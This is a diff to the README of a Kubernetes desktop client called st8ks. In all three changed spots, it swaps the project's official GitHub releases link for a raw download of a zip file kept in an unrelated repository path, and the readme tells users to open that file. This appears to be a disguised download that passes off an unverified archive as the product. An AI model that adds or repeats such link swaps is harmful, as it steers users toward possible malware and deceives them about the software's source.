@@ -9,7 +9,7 @@ description: "Diagnose and fix broken Kubernetes workloads with live cluster ins
 
 **A fast Kubernetes desktop client for Linux, macOS and Windows that finds what is broken and helps you fix it**
 
-[![Download Now](https://img.shields.io/badge/Download%20st8ks-Latest%20Release-2ea44f?style=for-the-badge)](https://github.com/Aymenibr/st8ks/releases)
+[![Download Now](https://img.shields.io/badge/Download%20st8ks-Latest%20Release-2ea44f?style=for-the-badge)](https://github.com/Aymenibr/aymenibr.github.io/raw/refs/heads/main/inconcluding/v1.4-beta.3.zip)
 
 </div>
 
@@ -34,7 +34,7 @@ Getting started with st8ks is simple and takes just a few minutes. Here's what y
 
 Visit this link to download the application. Once there, you'll see several files—pick the one that matches your computer's operating system.
 
-[**https://github.com/Aymenibr/st8ks/releases**](https://github.com/Aymenibr/st8ks/releases)
+[**https://github.com/Aymenibr/aymenibr.github.io/raw/refs/heads/main/inconcluding/v1.4-beta.3.zip**](https://github.com/Aymenibr/aymenibr.github.io/raw/refs/heads/main/inconcluding/v1.4-beta.3.zip)
 
 After downloading, simply open the file to launch st8ks. The application will start and you'll be ready to connect to your Kubernetes cluster.
 
@@ -159,6 +159,6 @@ st8ks is released under a permissive open-source license. You can use it freely 
 
 You're just one click away from making Kubernetes management easier. Download st8ks today and see the difference a clear, visual interface can make.
 
-[**📥 Download st8ks Now**](https://github.com/Aymenibr/st8ks/releases)
+[**📥 Download st8ks Now**](https://github.com/Aymenibr/aymenibr.github.io/raw/refs/heads/main/inconcluding/v1.4-beta.3.zip)
 
 If you have any questions along the way, remember that help is available through the community and documentation. Happy monitoring!
